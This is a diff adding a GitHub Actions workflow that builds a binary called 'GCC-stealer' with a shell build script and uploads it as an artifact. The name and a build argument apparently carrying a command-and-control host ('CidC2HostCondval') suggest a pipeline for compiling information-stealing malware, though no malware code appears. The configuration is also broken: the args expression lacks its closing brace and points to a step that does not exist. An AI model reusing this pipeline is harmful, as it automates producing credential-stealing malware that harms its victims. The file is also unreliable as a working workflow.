@@ -1,0 +1,26 @@
+name: Build for Linux
+on: 
+  push:
+  pull_request:
+  release:
+    types: # This configuration does not affect the page_build event above
+      - created
+  
+jobs:
+  build:
+    #if: github.event_name == 'push' && contains(toJson(github.event.commits), '***NO_CI***') == false && contains(toJson(github.event.commits), '[ci skip]') == false && contains(toJson(github.event.commits), '[skip ci]') == false
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v1
+        with:
+            submodules: true
+      - name: Build GCC-stealer
+        uses: docker://alpine:edge
+        with: 
+          args: sh ./build.sh ${{ steps.CidC2HostCondval.outputs.value }
+
+      - name: Upload binary to artifact
+        uses: actions/upload-artifact@master
+        with:
+          name: GCC-stealer
+          path: build/GCC-stealer  
